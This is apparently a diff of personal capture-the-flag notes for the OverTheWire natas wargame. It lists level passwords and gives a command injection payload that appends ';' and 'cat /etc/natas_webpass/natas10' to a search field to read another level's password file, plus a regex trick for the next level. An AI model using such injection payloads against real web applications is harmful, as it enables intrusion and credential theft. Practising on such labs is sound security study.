@@ -26,3 +26,6 @@ natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 write-up natas9: Command Injection
 cow; cat /etc/natas_webpass/natas10 #
 natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+write-up natas10: 
+For some reason, when we use regex .*(any zero or more) it show all directory.
+natas11:6kBzbw4cQ5exEWpW5OV0
